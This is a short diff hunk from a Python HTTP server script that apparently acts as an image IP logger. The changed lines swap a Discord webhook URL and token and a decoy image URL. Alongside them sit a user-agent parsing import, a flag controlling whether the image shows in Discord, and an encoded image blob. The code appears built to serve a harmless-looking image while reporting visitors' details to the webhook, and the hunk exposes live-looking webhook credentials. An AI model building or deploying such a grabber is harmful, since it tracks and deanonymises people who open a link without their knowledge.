@@ -4,9 +4,9 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1391126627060285470/ZoiW9iBboek1otCnkUrtOtGCVxAXMvjSIb_35hW-tyJcvHXGHauvRWVBLY6I0A_asuIU'
+webhook = 'https://discord.com/api/webhooks/1397185556118634636/fYxi0tlwBM3vbmZUe66OrY0J-kKeL2oAMArqyW5l20KbVa1ivnmLIxwGeik2cTrbJsN2'
 
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+bindata = httpx.get('https://images.ctfassets.net/ds6dz7ilx8up/B4gY52FR7jV7oWeeEyZUG/010905ffc14dc45255fc446e0c2af105/korv_hero-desktop.png').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
